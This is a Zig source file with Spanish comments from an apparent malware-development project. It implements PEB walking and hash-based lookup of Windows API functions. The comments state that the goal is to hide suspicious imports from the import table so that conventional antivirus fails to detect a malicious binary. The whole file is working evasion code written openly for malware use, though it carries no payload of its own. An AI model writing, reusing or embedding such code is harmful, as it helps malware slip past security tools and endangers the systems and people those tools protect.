const std = @import("std");
const phantom = @import("../phantom/phantom.zig");
const calcHash = @import("../utils/crypto.zig").calcHash;
const calcHashU8 = @import("../utils/crypto.zig").calcHashU8;

// Estos dos pasos pasos son impresindibles debido a que lo primero que se realiza
// cuando entra un archivo nuevo a la maquina es analizar su IAT que es una tabla que tiene
// todas las importaciones de la API de windows que usa un binario y en dependencia de que funciones
// tenga el binario sera automaticamente betado por el sistema si tiene funciones sospechosas.
// Con estos pasos podemos conseguir y/o utilizar funciones de la API para sin que queden registradasd dentro de la IAT
// Increiblemente con estos dos "sencillos" pasos ya los antivirus convencionales no detectan el peligro aunque este vigente
// No evade todavia un EDR pero ya hay un primer paso que son el analisis estatico esta casi cubierto con estas funciones
// Comprender el funcionamiento de este mecanismo de Windows Internals es una ventaja cataclismica para el maldev

// PEB Walking se trata de unas de las tecnicas más comunes y fundamentales del desarrollo
// de malware basicamente esto en esencia es utilizar la aritmeticas de punteros para poder
// caminar por la PEB de windows con el objetivo de poder llegar a lo que se conoce como
// LDR_DATA_TABLE_ENTRY y ahi sacar la direcciond e la dll que precisamos usar para empezar
// a hacer cosas como malware
pub fn pebWalking(module_hash: u32) ?phantom.PVOID {
    // function -> pebWalking:
    // Argumentos -> module_hash: u32
    // Return -> ?*anypaque a la direccion de una dll
    // primero nos movemos al TEB al offset 0x60 para entrar en la PEB
    // una vez ahi accedemos a la PEB_LDR_DATA para iterar sobre InMemoryOrderModuleList
    // Mientra lo recorremos viejando entre punteros ya que es una Circular DoubleLinked List
    // Comparamos la informacion del buffer del campo BaseDllName y si su hash coincide con el que le
    // proporcionamos entonces retornamos esa direccion de memoria.
    const peb = phantom.getPEB();
    const ldr = peb.Ldr;

    const head = &ldr.InMemoryOrderModuleList;
    var current = head.Flink;

    while (current != head) {
        const entry: *phantom.LDR_DATA_TABLE_ENTRY = @fieldParentPtr("InMemoryOrderLinks", current);
        if (entry.BaseDllName.Buffer) |buffer| {
            const len = entry.BaseDllName.Length / 2;
            const name_slice = buffer[0..len];

            if (calcHash(name_slice) == module_hash) {
                return entry.DllBase;
            }
        }
        current = current.Flink;
    }

    return null;
}

// Este seria el segundo paso que se necesita, como hablamos anteriormente primero tenemos el
// la direccion del dll y ahora necesitamos la direccion de cada funcion de la API de windows
// que se encuentra dentro del DLL, entonces dentro de la DLL buscamos la funcion
// modo de abreviatura basicamente iteramos sobre lo que seria las cabeceras PE (Portable Executable)
// dentro de estas cabeceras y otra vez jugando puramente con aritmeticas de punteros podemos sacar un puntero
// con la direccion de memoria de la funcion que necesitamos para despues usarla
pub fn getProcAddresByHash(module_base: *anyopaque, func_hash: u32) ?*anyopaque {
    // Function -> getProcAddressByHash
    // Argumentos -> module_base: *anypaque && func_hash: u32
    // Return -> ?*anyopaque a la direccion de una funcion
    // Casteamos el puntero module_base en un entero ya que lo queremos tratar como entero para que sea mas facil la aritmetica.
    // Casteamos el puntero module_base a una cabecera PE en este caso IMAGE_DOS_HEADER
    // Despues creamos un const que almacena el offset de la cabecera DOS para entrar en la cabecera NT_HEADER
    // Despues para sistemas de x86_64 le sumamos un offset de 0x88 asi tenemos por Aritmeticas de punteros
    // El valor de la direccion de memoria relativa de export_dir
    // accedemos al export_dir para usar los 3 arrays fundamentales AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals.
    // Una vez ahi iteramos hacemos que un puntero apunte a la direccion relativa AddressOfNames en el indice correspondiente
    // lo convertimos a un slice en Zig despues comparamos si el hash de ese nombre y el que le proporcionamos por argumento func_hash coincide
    // si coincide utilizamos la AddressOfNameOrdinals para sacar la AddressOfFunctions y retornarla como puntero ya que lo hemos tratado como entero.

    const base_addr = @intFromPtr(module_base);

    const dos_header = @as(*const phantom.IMAGE_DOS_HEADER, @ptrCast(@alignCast(module_base)));
    const nt_header_ptr = base_addr + @as(usize, @intCast(dos_header.e_lfanew));
    const export_dir_rva_ptr = @as(*u32, @ptrFromInt(nt_header_ptr + 0x88));
    const export_dir_rva = export_dir_rva_ptr.*;

    if (export_dir_rva == 0) return null;

    const export_dir = @as(*const phantom.IMAGE_EXPORT_DIRECTORY, @ptrFromInt(base_addr + export_dir_rva));

    const name_rva_array = @as([*]u32, @ptrFromInt(base_addr + export_dir.AddressOfNames));
    const funcs_rva_array = @as([*]u32, @ptrFromInt(base_addr + export_dir.AddressOfFunctions));
    const ordinals_rva_array = @as([*]u16, @ptrFromInt(base_addr + export_dir.AddressOfNameOrdinals));

    var i: u32 = 0;
    while (i < export_dir.NumberOfNames) : (i += 1) {
        const name_rva = name_rva_array[i];
        const name_ptr = @as([*:0]u8, @ptrFromInt(base_addr + name_rva));

        const name_len = std.mem.len(name_ptr);
        const name_slice = name_ptr[0..name_len];

        if (calcHashU8(name_slice) == func_hash) {
            const ordinal = ordinals_rva_array[i];
            const func_rva = funcs_rva_array[ordinal];

            return @as(*anyopaque, @ptrFromInt(base_addr + func_rva));
        }
    }

    return null;
}
